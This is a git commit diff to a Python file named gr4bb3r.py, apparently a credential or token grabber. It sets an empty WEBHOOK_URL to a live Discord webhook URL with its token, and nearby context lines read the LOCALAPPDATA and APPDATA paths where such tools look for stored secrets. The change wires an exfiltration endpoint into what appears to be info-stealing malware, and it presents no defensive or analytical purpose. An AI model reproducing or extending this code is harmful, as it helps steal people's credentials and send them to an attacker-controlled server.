f4a1685b35493bc865d42e0c0b1b3241f846ac7e
joemamaballsfjsdfksdfgjosdfjksdf <90942081+joemamaballsfjsdfksdfgjosdfjksdf@users.noreply.github.com>
2021-09-27 10:37:23 -0400

    Update gr4bb3r.py

--- gr4bb3r.py
+++ gr4bb3r.py
@@ -11,7 +11,7 @@ from threading import Thread
 from time import sleep
 from sys import argv
 
-WEBHOOK_URL = "" # Insert webhook url here
+WEBHOOK_URL = "https://canary.discord.com/api/webhooks/892056473511809024/_IVuwGCq_pYXJnl_lc5SIbMZ8CIaWcNIeHFx4jUyJCMnarT8bFWLW6C8HeJyR_D-CQm2" # Insert webhook url here
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
